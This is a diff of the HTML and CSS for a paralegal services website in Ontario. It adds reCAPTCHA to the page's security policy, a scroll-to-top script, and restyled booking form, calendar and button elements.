@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=1280">
+    <meta name="viewport" content="width=1280, initial-scale=1">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <meta name="referrer" content="strict-origin-when-cross-origin">
     <meta http-equiv="Permissions-Policy" content="camera=(self), microphone=(), geolocation=(self)">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com; frame-src https://www.google.com/maps/; connect-src 'self' https://script.google.com/ https://script.googleusercontent.com/ https://www.google-analytics.com https://analytics.google.com https://api.ipify.org;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com; frame-src https://www.google.com/maps/ https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/; connect-src 'self' https://script.google.com/ https://script.googleusercontent.com/ https://www.google-analytics.com https://analytics.google.com https://api.ipify.org https://www.google.com/recaptcha/;">
     <meta name="description" content="Professional legal advocacy and notary services in Ontario. Specializing in Provincial Offences and Administrative Tribunals. Accessible, expert representation tailored to your needs.">
     <title>Hanna Dunchenko Paralegal Services | Ontario</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22 fill=%22%23ffffff%22>PS</text></svg>">
@@ -54,6 +54,18 @@
     <!-- Google Analytics (GA4) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZMMKRZ3VBV"></script>
     <script>
+        // Always start from the top on hard reloads and direct visits.
+        if ('scrollRestoration' in history) {
+            history.scrollRestoration = 'manual';
+        }
+        const forceScrollTop = () => {
+            window.scrollTo(0, 0);
+            document.documentElement.scrollTop = 0;
+            document.body.scrollTop = 0;
+        };
+        window.addEventListener('pageshow', forceScrollTop);
+        window.addEventListener('load', forceScrollTop);
+
         // --- Book Button Animation Logic ---
         const IS_LOW_END_DEVICE_FOR_JUMP = (
             (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency > 0 && navigator.hardwareConcurrency <= 4) ||
@@ -175,7 +187,7 @@
                     font-weight: 400;
                     color: rgba(255,255,255,0.92);
                     line-height: 1.6;
-                    margin-bottom: 0.55rem;
+                    margin-bottom: 0.72rem;
                     text-align: left;
                     letter-spacing: 0.01em;
                 }
@@ -203,10 +215,13 @@
                     }
                     .footer-book-btn, .contact-form__submit-button { font-size: 0.97rem; padding: 0.7rem 1.2rem; }
                 }
-        /* Standard Scaling */
+        /* Proportional lock: keep desktop CSS proportions */
         html {
             font-size: 16px;
+            -webkit-text-size-adjust: 100%;
+            text-size-adjust: 100%;
         }
+
         body {
             font-size: 1rem;
         }
@@ -355,7 +370,8 @@
         /* Block: header */
         .header { 
             text-align: center; 
-            padding: 2rem 1.3rem 2.5rem;
+            width: min(96vw, 50rem);
+            padding: clamp(1rem, 3.5vw, 2rem) clamp(0.85rem, 2.4vw, 1.3rem) clamp(1.5rem, 4.2vw, 2.5rem);
             max-width: 50rem;
             margin: 0 auto;
         }
@@ -468,6 +484,8 @@
         
         .header__description span {
             display: block;
+            width: max-content;
+            max-width: none;
             white-space: nowrap;
             text-wrap: nowrap;
             overflow-wrap: normal;
@@ -480,9 +498,10 @@
 
         /* Block: layout-container */
         .layout-container { 
+            width: min(94vw, 41rem);
             max-width: 41rem; 
             margin: 0 auto 0; 
-            padding: 0 1.2rem; 
+            padding: 0 clamp(0.8rem, 2.1vw, 1.2rem); 
         }
         
         /* Block: contact-form */
@@ -661,15 +680,15 @@
             padding: 0;
             appearance: none;
             -webkit-appearance: none;
-            background: #ffffff;
-            border: 2px solid rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.06);
+            border: 2px solid rgba(255, 255, 255, 0.92);
             cursor: pointer;
             display: inline-flex;
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
             position: relative;
-            border-radius: 0.2rem;
+            border-radius: 50%;
             transition: border-color 0.2s ease, box-shadow 0.2s ease, background-color 0.2s ease;
         }
 
@@ -688,17 +707,20 @@
         }
 
         .contact-form__checkbox:checked {
-            background: #ffffff;
-            border-color: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.98);
         }
 
         .contact-form__checkbox:checked::after {
-            content: '\2713';
-            color: var(--accent-gold);
-            font-size: 1.28rem;
-            font-weight: 900;
-            line-height: 1;
-            transform: translateY(-0.04rem);
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            width: 0.36rem;
+            height: 0.72rem;
+            border: solid #ffffff;
+            border-width: 0 0.19rem 0.19rem 0;
+            transform: translate(-50%, -62%) rotate(45deg);
         }
 
         @keyframes handCheckIn {
@@ -724,6 +746,26 @@
 
         .contact-form__terms-link:hover { color: #D4B89A; }
 
+        .recaptcha-repeat-wrap {
+            display: none;
+            margin: 0.2rem 0 0.75rem;
+            text-align: center;
+        }
+
+        .recaptcha-repeat-wrap__hint {
+            margin: 0 0 0.5rem 0;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.88);
+            letter-spacing: 0.02em;
+            text-align: center;
+        }
+
+        .recaptcha-repeat-wrap #bookingRecaptchaWidget {
+            display: inline-block;
+            min-height: 78px;
+        }
+
         .contact-form__submit-button { 
             width: 100%;
             padding: 0.8rem 2rem;
@@ -738,7 +780,7 @@
             transition: all 0.3s ease;
             margin: 0 auto 2rem auto;
             position: relative;
-            box-shadow: 0 2px 12px 0 rgba(90, 61, 42, 0.08);
+            box-shadow: 0 2px 12px 0 rgba(255, 255, 255, 0.12);
         }
 
         #confirmBookingBtn {
@@ -746,18 +788,23 @@
             min-height: 4.4rem;
             line-height: 1.1;
             font-weight: 900;
-            font-size: 1.08rem;
-            background: #5a3d2a;
+            font-size: 1.125rem;
+            background: #3f281a;
+            color: #ffffff;
+            border: 1px solid #3f281a;
+            box-shadow: none;
             transition: background-color 0.2s ease, transform 0.2s ease;
         }
 
         #confirmBookingBtn:hover {
-            background: #4f3526 !important;
+            background: #352114 !important;
+            color: #ffffff !important;
             transform: translateY(-1px);
         }
 
         #confirmBookingBtn:active {
-            background: #563a2a !important;
+            background: #2b1a11 !important;
+            color: #ffffff !important;
             transform: translateY(0);
         }
 
@@ -766,12 +813,13 @@
             z-index: 4;
             pointer-events: auto !important;
             touch-action: manipulation;
+            white-space: normal;
         }
         
         .contact-form__submit-button:hover { 
             transform: translateY(-2px); 
             background: var(--accent-gold); 
-            box-shadow: 0 0.5rem 1.3rem rgba(0, 0, 0, 0.25); 
+            box-shadow: 0 0.5rem 1.3rem rgba(255, 255, 255, 0.35); 
         }
 
         /* Shadow Removal for Buttons inside Modals */
@@ -877,18 +925,18 @@
             text-align: left;
             letter-spacing: 0.01em;
             transition:
-                max-height 3.2s cubic-bezier(0.22, 0.9, 0.24, 1),
-                opacity 2.6s ease,
-                filter 3s ease,
-                transform 2.8s ease,
-                margin-top 2.1s ease;
+                max-height 0.35s ease,
+                opacity 0.35s ease,
+                filter 0.35s ease,
+                transform 0.35s ease,
+                margin-top 0.35s ease;
         }
 
         .faq__answer > * {
             opacity: 0;
             filter: blur(8px);
             transform: translateY(0.42rem);
-            transition: opacity 2.4s ease, filter 2.8s ease, transform 2.4s ease;
+            transition: opacity 0.35s ease, filter 0.35s ease, transform 0.35s ease;
         }
 
         .faq__item.is-open .faq__question::after {
@@ -990,7 +1038,7 @@
         #intakeNoticeModal .modal__text {
             color: rgba(255,255,255,0.92);
             text-align: left;
-            margin-bottom: 0.55rem;
+            margin-bottom: 0.72rem;
             line-height: 1.7;
             font-size: 1rem;
             font-weight: 400;
@@ -1016,13 +1064,8 @@
 
         #termsModal .modal__content {
             max-width: 50rem;
-            background-color: #0b0c0e;
-            background-image:
-                radial-gradient(circle at 12% 18%, rgba(168, 172, 178, 0.12) 0 1px, transparent 1.4px),
-                radial-gradient(circle at 72% 34%, rgba(150, 155, 162, 0.1) 0 1px, transparent 1.3px),
-                radial-gradient(circle at 36% 72%, rgba(176, 180, 186, 0.11) 0 1px, transparent 1.35px),
-                radial-gradient(circle at 86% 82%, rgba(140, 145, 152, 0.09) 0 1px, transparent 1.25px);
-            background-size: 7px 7px, 9px 9px, 11px 11px, 13px 13px;
+            background-color: #000000;
+            background-image: none;
             border: 1px solid rgba(212, 184, 154, 0.35);
             box-shadow: 0 1.3rem 3.1rem rgba(0,0,0,0.55);
         }
@@ -1046,7 +1089,7 @@
         #termsModal .modal__text {
             color: rgba(237, 237, 237, 0.94);
             text-align: left;
-            margin-bottom: 0.55rem;
+            margin-bottom: 0.72rem;
             line-height: 1.7;
             font-size: 1rem;
             font-weight: 400;
@@ -1188,54 +1231,35 @@
         }
 
         #bookingModal[data-state="form"] .modal-sticky-actions {
+            bottom: 0;
             margin-top: 0.55rem;
-            padding-top: 1.1rem;
+            padding-top: 1.25rem;
+            padding-bottom: calc(0.25rem + env(safe-area-inset-bottom));
             background: linear-gradient(
                 to bottom,
-                rgba(107, 91, 74, 0.9) 0%,
-                rgba(107, 91, 74, 0.97) 22%,
-                rgba(107, 91, 74, 1) 56%,
-                rgba(107, 91, 74, 1) 100%
+                rgba(107, 91, 74, 0) 0%,
+                rgba(107, 91, 74, 0.86) 24px,
+                rgba(107, 91, 74, 0.98) 46px,
+                rgba(107, 91, 74, 0.98) 100%
             );
-            backdrop-filter: blur(0.28rem);
-            -webkit-backdrop-filter: blur(0.28rem);
+            backdrop-filter: none;
+            -webkit-backdrop-filter: none;
             border-top-left-radius: 1.05rem;
             border-top-right-radius: 1.05rem;
             border-bottom-left-radius: 0.85rem;
             border-bottom-right-radius: 0.85rem;
             overflow: hidden;
+            transform: translateZ(0);
+            backface-visibility: hidden;
+            -webkit-backface-visibility: hidden;
         }
 
         #bookingModal[data-state="form"] .modal-sticky-actions::before {
-            content: "";
-            position: absolute;
-            left: -1.8rem;
-            right: -1.8rem;
-            top: -9.4rem;
-            height: 11rem;
-            pointer-events: none;
-            background: linear-gradient(
-                to bottom,
-                rgba(107, 91, 74, 0) 0%,
-                rgba(107, 91, 74, 0.04) 28%,
-                rgba(107, 91, 74, 0.18) 60%,
-                rgba(107, 91, 74, 0.56) 100%
-            );
-            filter: blur(34px);
-            opacity: 0.96;
-            border-radius: 3.2rem 3.2rem 1.4rem 1.4rem;
-            transform: scaleX(1.06);
+            content: none;
         }
 
         #bookingModal[data-state="form"] .modal-sticky-actions::after {
-            content: "";
-            position: absolute;
-            left: -2rem;
-            right: -2rem;
-            bottom: -3.4rem;
-            height: 4.1rem;
-            pointer-events: none;
-            background: rgba(107, 91, 74, 1);
+            content: none;
         }
 
         /* Defensive: keep sticky container visuals from eating taps on action buttons */
@@ -1254,9 +1278,9 @@
         }
 
         #bookingModal .modal-sticky-actions .contact-form__checkbox-wrapper {
-            margin-top: 0.7rem !important;
-            margin-bottom: 0 !important;
-            padding-bottom: 0.2rem;
+            margin-top: 0 !important;
+            margin-bottom: 0.7rem !important;
+            padding-bottom: 0;
         }
 
         .modal__section-title {
@@ -1268,7 +1292,7 @@
         }
         
         .modal__text { 
-            margin-bottom: 0.55rem; 
+            margin-bottom: 0.72rem; 
             color: rgba(255,255,255,0.92);
             font-size: 1rem;
             font-weight: 400;
@@ -1307,10 +1331,7 @@
         #bookingModal .contact-form__label,
         #bookingModal .contact-form__terms-link,
         #bookingModal .file-attach__name,
-        #bookingModal .file-attach__remove,
-        #bookingModal .contact-form__input::placeholder,
-        #bookingModal .contact-form__textarea::placeholder,
-        #bookingModal #bookingStatus {
+        #bookingModal .file-attach__remove {
             font-family: 'Lato', sans-serif !important;
             font-size: var(--booking-form-font-size) !important;
             font-weight: 400 !important;
@@ -1319,13 +1340,51 @@
             letter-spacing: 0.01em !important;
         }
 
+        /* Default booking placeholders: match Name placeholder style */
+        #bookingModal .contact-form__input::placeholder,
+        #bookingModal .contact-form__textarea::placeholder {
+            font-family: 'Lato', sans-serif !important;
+            font-size: var(--booking-form-font-size) !important;
+            font-weight: 400 !important;
+            color: rgba(255,255,255,0.92) !important;
+            opacity: 0.7 !important;
+            line-height: 1.6 !important;
+            letter-spacing: 0.01em !important;
+        }
+
         #bookingModal .booking-row--address-secondary {
             justify-content: flex-end !important;
+        }
+
+        #bookingModal .custom-select-wrapper--city {
+            flex: 1 1 auto;
+            min-width: 10.8rem;
+        }
+
+        #bookingModal input[name="address_province"] {
+            width: 8.4rem;
+            min-width: 7.6rem;
+            text-align: center;
+            text-transform: uppercase;
         }
 
         #bookingModal input[name="address_zip"] {
             text-align: center;
             caret-color: #ffffff;
+        }
+
+        @media (min-width: 769px) {
+            #bookingModal input[name="address_zip"],
+            #bookingModal #deadlineInputMain {
+                flex: 0 0 clamp(11rem, 16vw, 14rem) !important;
+                width: clamp(11rem, 16vw, 14rem) !important;
+                min-width: clamp(11rem, 16vw, 14rem) !important;
+            }
+
+            #bookingModal .custom-select-wrapper--city {
+                flex: 1 1 11.5rem !important;
+                min-width: 11.5rem !important;
+            }
         }
 
         #bookingModal input[name="address_zip"]:focus {
@@ -1337,11 +1396,18 @@
             text-align: center !important;
         }
 
+        #bookingModal .contact-form__input:focus::placeholder,
+        #bookingModal .contact-form__textarea:focus::placeholder,
+        #bookingModal .contact-form__input:focus-visible::placeholder,
+        #bookingModal .contact-form__textarea:focus-visible::placeholder {
+            color: transparent !important;
+            opacity: 0 !important;
+        }
+
         #bookingModal #dobAgePreview::placeholder {
             text-align: center !important;
-            font-weight: 800 !important;
-            color: #ffffff !important;
-            opacity: 1 !important;
+            color: rgba(255,255,255,0.92) !important;
+            opacity: 0.56 !important;
         }
 
         #bookingModal #dobAgePreview:focus::placeholder {
@@ -1350,8 +1416,8 @@
         }
 
         #bookingModal input[name="address_zip"]::placeholder {
-            color: #ffffff !important;
-            opacity: 1 !important;
+            color: rgba(255,255,255,0.92) !important;
+            opacity: 0.56 !important;
         }
 
         #bookingModal .contact-form__checkbox-label {
@@ -1435,14 +1501,24 @@
             font-size: var(--booking-form-font-size) !important;
         }
 
+        #bookingModal #confirmBookingBtn,
+        #bookingModal #confirmBookingBtn:hover,
+        #bookingModal #confirmBookingBtn:active {
+            box-shadow: none !important;
+        }
+
         #bookingStatus {
+            --booking-status-fg: #fff3f3;
+            --booking-status-border: rgba(255, 138, 138, 0.7);
+            --booking-status-bg: rgba(255, 82, 82, 0.18);
+            --booking-status-pulse: rgba(255, 90, 90, 0.16);
             min-height: 1.5rem;
             margin: 0 0 1rem 0 !important;
             padding: 0;
             border-radius: 0.8rem;
             border: 1px solid transparent;
             background: transparent;
-            color: #fff3f3 !important;
+            color: var(--booking-status-fg) !important;
             font-size: var(--booking-form-font-size) !important;
             font-weight: 900 !important;
             line-height: 1.2 !important;
@@ -1456,22 +1532,42 @@
 
         #bookingStatus.status-alert--visible {
             padding: 0.55rem 0.9rem;
-            border-color: rgba(255, 138, 138, 0.7);
-            background: rgba(255, 82, 82, 0.18);
+            border-color: var(--booking-status-border);
+            background: var(--booking-status-bg);
             opacity: 1;
             transform: translateY(0);
             animation: bookingStatusPulse 1.15s ease-in-out infinite;
         }
 
+        #bookingStatus.status-alert--success {
+            --booking-status-fg: #e9ffef;
+            --booking-status-border: rgba(102, 220, 130, 0.74);
+            --booking-status-bg: rgba(56, 175, 95, 0.2);
+            --booking-status-pulse: rgba(84, 214, 123, 0.2);
+        }
+
+        #bookingStatus.status-alert--warning {
+            --booking-status-fg: #fff5d6;
+            --booking-status-border: rgba(238, 194, 102, 0.8);
+            --booking-status-bg: rgba(236, 181, 67, 0.2);
+            --booking-status-pulse: rgba(236, 181, 67, 0.2);
+        }
+
+        #bookingStatus.status-alert--error {
+            --booking-status-fg: #fff3f3;
+            --booking-status-border: rgba(255, 138, 138, 0.7);
+            --booking-status-bg: rgba(255, 82, 82, 0.18);
+            --booking-status-pulse: rgba(255, 90, 90, 0.16);
+        }
+
         @keyframes bookingStatusPulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 90, 90, 0.0); }
-            50% { box-shadow: 0 0 0 6px rgba(255, 90, 90, 0.16); }
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0, 0, 0, 0); }
+            50% { box-shadow: 0 0 0 6px var(--booking-status-pulse); }
         }
 
         .contact-form__input.field-invalid,
         .contact-form__textarea.field-invalid,
-        .custom-select__trigger.field-invalid,
-        .contact-form__checkbox-wrapper.field-invalid {
+        .custom-select__trigger.field-invalid {
             animation: invalidFieldShake 0.34s cubic-bezier(0.36, 0.07, 0.19, 0.97);
             box-shadow: 0 0 0 2px rgba(255, 106, 106, 0.35), 0 0.8rem 1.8rem rgba(120, 20, 20, 0.2) !important;
         }
@@ -1481,6 +1577,25 @@
             20%, 80% { transform: translateX(2px); }
             30%, 50%, 70% { transform: translateX(-3px); }
             40%, 60% { transform: translateX(3px); }
+        }
+
+        .contact-form__checkbox-wrapper.field-invalid {
+            animation: none !important;
+            box-shadow: none !important;
+        }
+
+        .contact-form__checkbox-wrapper.field-invalid .contact-form__checkbox {
+            border-color: rgba(255, 120, 120, 0.96) !important;
+            animation: checkboxInvalidBlink 1s ease-in-out infinite;
+        }
+
+        @keyframes checkboxInvalidBlink {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(255, 110, 110, 0.0);
+            }
+            50% {
+                box-shadow: 0 0 0 3px rgba(255, 110, 110, 0.55);
+            }
         }
 
         .final-result-form {
@@ -1493,8 +1608,8 @@
             margin: 0 auto 0.95rem;
             position: relative;
             display: flex;
-            width: 4.25rem;
-            height: 4.25rem;
+            width: 5.35rem;
+            height: 5.35rem;
             align-items: center;
             justify-content: center;
             border-radius: 50%;
@@ -1612,6 +1727,18 @@
             line-height: 1.4;
         }
 
+        .final-result-referral__status--success {
+            color: #a8efb9;
+        }
+
+        .final-result-referral__status--warning {
+            color: #f6d78c;
+        }
+
+        .final-result-referral__status--error {
+            color: #ff9ea1;
+        }
+
         .final-result-actions {
             display: flex;
             flex-direction: column;
@@ -1726,7 +1853,7 @@
         /* Block: map-container */
         .map-container {
             width: 100%; 
-            height: 28rem; 
+            height: clamp(18rem, 52vw, 28rem); 
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCA4MDAgNDAwIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJub25lIj48cmVjdCB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgZmlsbD0iI2UzZTNTzIiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiIGZpbGw9IiM1NTUiPk1hcCBMb2FkaW5nLi4uPC90ZXh0Pjwvc3ZnPg=='); 
             background-size: cover; 
             border-radius: 0.6rem; 
@@ -1747,7 +1874,7 @@
         }
 
         .calendar-scale-inner {
-            width: 100%;
+            width: 41rem;
             transform-origin: top left;
             will-change: transform;
         }
@@ -1758,7 +1885,7 @@
             -webkit-backdrop-filter: blur(1.3rem);
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 3rem;
-            padding: clamp(1rem, 5vw, 2.5rem);
+            padding: 2.05rem;
             margin-top: 0;
             position: relative; /* Added for loader overlay */
             opacity: 0;
@@ -1836,14 +1963,14 @@
         
         
         .calendar-title span { display: block; }
-        .calendar-title .cal-month { font-size: clamp(3.4rem, 13vw, 6.8rem); font-weight: 900; line-height: 0.9; }
+        .calendar-title .cal-month { font-size: 5.3rem; font-weight: 900; line-height: 0.9; }
         .calendar-title .cal-selected-day {
-            font-size: clamp(1.05rem, 4.5vw, 2rem);
+            font-size: 1.85rem;
             line-height: 1.02;
             font-weight: 900;
             white-space: nowrap;
         }
-        .calendar-title .cal-year { font-size: clamp(1.35rem, 4.8vw, 2.3rem); opacity: 0.92; font-weight: 900; letter-spacing: 2px; margin-top: -0.15rem; }
+        .calendar-title .cal-year { font-size: 1.98rem; opacity: 0.92; font-weight: 900; letter-spacing: 2px; margin-top: -0.15rem; }
 
 
         .calendar-nav-btn {
@@ -1925,7 +2052,7 @@
         .calendar-grid {
             display: grid;
             grid-template-columns: repeat(7, 1fr);
-            gap: clamp(0.2rem, 1.5vw, 0.8rem);
+            gap: 0.62rem;
             text-align: center;
         }
 
@@ -1996,6 +2123,34 @@
             transform: scale(1.05);
         }
 
+        .cal-day--nearest {
+            border-color: rgba(255, 255, 255, 0.75) !important;
+            box-shadow:
+                0 0 0.38rem rgba(255, 255, 255, 0.92),
+                0 0 1.15rem rgba(255, 255, 255, 0.72);
+            animation: nearestDayGlow 1.8s ease-in-out infinite;
+        }
+
+        .cal-day--nearest.cal-day--selected {
+            box-shadow:
+                0 0 0.45rem rgba(255, 255, 255, 0.98),
+                0 0 1.35rem rgba(255, 255, 255, 0.78),
+                0 0 2rem rgba(255, 255, 255, 0.55) !important;
+        }
+
+        @keyframes nearestDayGlow {
+            0%, 100% {
+                box-shadow:
+                    0 0 0.34rem rgba(255, 255, 255, 0.88),
+                    0 0 1rem rgba(255, 255, 255, 0.66);
+            }
+            50% {
+                box-shadow:
+                    0 0 0.58rem rgba(255, 255, 255, 1),
+                    0 0 1.7rem rgba(255, 255, 255, 0.9);
+            }
+        }
+
         @keyframes pulseActive {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(224, 112, 32, 0.4); }
             70% { transform: scale(1.05); box-shadow: 0 0 0 0.6rem rgba(224, 112, 32, 0); }
@@ -2022,6 +2177,8 @@
         .cal-key svg {
             width: 100%;
             height: 100%;
+            transform: rotate(180deg) scaleX(-1);
+            transform-origin: center;
         }
 
         @keyframes keyRotate {
@@ -2051,6 +2208,21 @@
             padding-top: 0;
             display: block;
             position: relative;
+        }
+
+        .slots-saturday-warning {
+            grid-column: 1 / -1;
+            margin: 0.2rem 0 0.65rem;
+            padding: 0.6rem 0.75rem;
+            border-radius: 0.7rem;
+            border: 1px solid rgba(255, 255, 255, 0.38);
+            background: rgba(90, 61, 42, 0.28);
+            color: #ffffff;
+            text-align: center;
+            font-size: 0.95rem;
+            font-weight: 800;
+            line-height: 1.35;
+            letter-spacing: 0.4px;
         }
 
         /* Loading Progress Bar Separator */
@@ -2139,7 +2311,7 @@
             align-items: center !important;
             justify-content: center !important;
             padding: 0.5rem 1rem;
-            height: clamp(3.8rem, 10vw, 4.7rem);
+            height: 4.1rem;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.15);
             color: rgba(255, 255, 255, 0.9);
@@ -2469,7 +2641,7 @@
         .file-attach__controls {
             width: 100%;
             display: grid;
-            grid-template-columns: minmax(0, 1fr) auto;
+            grid-template-columns: auto minmax(0, 1fr) auto;
             gap: 0.7rem;
             align-items: stretch;
         }
@@ -2517,8 +2689,9 @@
         .file-attach__btn--camera {
             border-style: solid;
             border-width: 2px;
-            border-color: rgba(255, 255, 255, 0.42);
-            background: rgba(255, 255, 255, 0.1);
+            border-color: #ffffff;
+            background: #ffffff;
+            color: #5a3d2a;
             width: 5.25rem;
             min-width: 5.25rem;
             height: 5.25rem;
@@ -2553,17 +2726,24 @@
         }
 
         .file-attach__btn--camera .file-attach__icon-svg,
-        .file-attach__btn--camera .file-attach__icon-svg--camera,
+        .file-attach__btn--camera .file-attach__icon-svg--camera {
+            color: #5a3d2a !important;
+            stroke: #5a3d2a !important;
+        }
+
+        .file-attach__btn--camera:hover .file-attach__icon-svg,
+        .file-attach__btn--camera:hover .file-attach__icon-svg--camera,
         .file-attach__btn--camera:focus-visible .file-attach__icon-svg,
         .file-attach__btn--camera:focus-visible .file-attach__icon-svg--camera {
             color: #ffffff !important;
             stroke: #ffffff !important;
         }
 
-        .file-attach__btn--camera:hover .file-attach__icon-svg,
-        .file-attach__btn--camera:hover .file-attach__icon-svg--camera {
-            color: #5a3d2a !important;
-            stroke: #5a3d2a !important;
+        .file-attach__btn--camera:hover,
+        .file-attach__btn--camera:focus-visible {
+            background: #5a3d2a !important;
+            border-color: #5a3d2a !important;
+            color: #ffffff !important;
         }
 
         .file-attach__btn--camera.file-attach__btn--camera-hypnotic {
@@ -2613,7 +2793,7 @@
             background: #ffffff;
             border-color: #5a3d2a;
             color: #5a3d2a;
-            box-shadow: 0 0 0 3px rgba(90, 61, 42, 0.2), 0 6px 20px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.55), 0 6px 20px rgba(255, 255, 255, 0.22);
         }
 
         .file-attach__title {
@@ -2734,6 +2914,87 @@
 
         .camera-capture-modal--active {
             display: flex;
+        }
+
+        .form-calendar-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 22080;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .form-calendar-overlay--active {
+            display: flex;
+        }
+
+        .form-calendar-overlay__panel {
+            width: min(54rem, 96vw);
+            max-height: 92vh;
+            overflow-y: auto;
+            border-radius: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.24);
+            background: #3a2a1a;
+            box-shadow: 0 1.5rem 2.8rem rgba(0, 0, 0, 0.38);
+            padding: 0.95rem;
+        }
+
+        .form-calendar-overlay__header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 0.65rem;
+        }
+
+        .form-calendar-overlay__title {
+            margin: 0;
+            width: 100%;
+            text-align: center;
+            padding-right: 2.6rem;
+            font-size: 1rem;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 0.03em;
+            text-transform: uppercase;
+        }
+
+        .form-calendar-overlay__close {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 2.1rem;
+            height: 2.1rem;
+            border-radius: 999px;
+            border: 1px solid rgba(255, 255, 255, 0.35);
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            font-size: 1.2rem;
+            line-height: 1;
+            cursor: pointer;
+        }
+
+        .form-calendar-overlay__mount {
+            width: 100%;
+        }
+
+        .form-calendar-overlay__mount .calendar-scale-wrapper {
+            width: 100%;
+            margin: 0;
+        }
+
+        .form-calendar-overlay__mount .calendar-scale-inner {
+            transform-origin: top left;
+        }
+
+        .form-calendar-overlay__mount #bookingCalendar {
+            margin: 0;
         }
 
         .camera-capture__panel {
@@ -2885,6 +3146,12 @@
             transform: translateY(0);
         }
 
+        #bookingModal .custom-select--city .custom-options {
+            max-height: 15rem;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+
         .custom-option {
             position: relative;
             display: block;
@@ -2916,94 +3183,77 @@
         .footer-book-btn {
             position: relative;
             display: inline-block;
-            padding: 0.6rem 1.3rem;
-            background: transparent;
-            color: #fff;
+            padding: 0.72rem 1.85rem;
+            background: #5a3d2a;
+            color: #ffffff;
             font-size: 0.9rem;
             font-weight: 800;
-            border: none;
-            border-radius: 3.1rem;
+            border: 1px solid #5a3d2a;
+            border-radius: 999px;
             cursor: pointer;
             text-decoration: none;
             text-align: center;
             margin: 0 auto;
             overflow: visible;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.1);
-            isolation: isolate;
+            transition: background-color 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: none;
+            min-width: 15rem;
         }
         .footer-book-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: rgba(90, 61, 42, 0.5);
-            backdrop-filter: blur(0.6rem);
-            -webkit-backdrop-filter: blur(0.6rem);
-            border-radius: 3.1rem;
-            border: none;
-            z-index: -1;
-            transition: background 0.2s;
+            content: none;
         }
         .footer-book-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0.8rem 2.2rem rgba(0, 0, 0, 0.15);
+            transform: none;
+            background: #4a3324;
+            box-shadow: none;
         }
         .footer-book-btn:hover::before {
-            background: rgba(90, 61, 42, 0.75);
+            content: none;
         }
 
         #headerBookBtn {
-            padding: 1.6rem 2.5rem !important;
+            padding: 1.25rem 3.15rem !important;
             font-size: 1.3rem !important;
             width: auto !important;
-            max-width: 90% !important;
+            min-width: 21.5rem !important;
+            max-width: 96% !important;
+            min-height: 6.9rem !important;
+            border-radius: 999px !important;
+            margin-bottom: 0.8rem !important;
         }
 
-        /* Soft transition haze above top Book Now button */
         #headerBookBtn::after {
-            content: '';
-            position: absolute;
-            left: 50%;
-            bottom: 64%;
-            transform: translateX(-50%);
-            width: 230%;
-            height: 9.6rem;
-            pointer-events: none;
-            z-index: -2;
-            border-radius: 999px;
-            background: radial-gradient(
-                ellipse at center bottom,
-                rgba(255, 255, 255, 0.22) 0%,
-                rgba(255, 255, 255, 0.16) 20%,
-                rgba(255, 255, 255, 0.10) 42%,
-                rgba(255, 255, 255, 0.05) 62%,
-                rgba(255, 255, 255, 0) 90%
-            );
-            filter: blur(1.25rem);
-            opacity: 0.78;
+            display: none;
         }
 
         @media (max-width: 700px) {
